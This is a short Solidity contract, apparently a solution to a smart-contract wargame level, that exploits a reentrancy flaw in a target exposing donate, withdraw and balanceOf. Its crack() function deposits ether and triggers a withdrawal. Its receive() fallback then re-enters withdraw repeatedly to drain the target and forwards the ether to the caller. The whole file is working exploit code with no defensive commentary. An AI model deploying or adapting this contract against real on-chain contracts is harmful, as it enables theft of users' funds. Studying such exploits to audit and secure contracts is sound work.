// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

interface ITarget{
    function donate(address _to) external payable;
    function withdraw(uint _amount) external;
    function balanceOf(address _who) external view returns (uint);
}

contract Reentrancy{

    ITarget target;
    // Send initial 0.001 ether with deployment
    constructor(address _target) payable public{
        target = ITarget(_target);
    }

    receive() payable external{
        target.withdraw(target.balanceOf(address(this)));
    }

    function crack() payable external{
        bool success;
        uint256 val = address(this).balance;
        // Donate first
        (success, ) = payable(address(target)).call{value: val}(abi.encodeWithSignature("donate(address)", address(this)));
        // require(success, "Fail donate");
        // Try withdraw
        target.withdraw(target.balanceOf(address(this)));
        (success, ) = msg.sender.call{value: address(this).balance}("");
        require(success, "Fail sendback");
    }
    function withdraw() payable external{
        msg.sender.transfer(address(this).balance);
    }
}
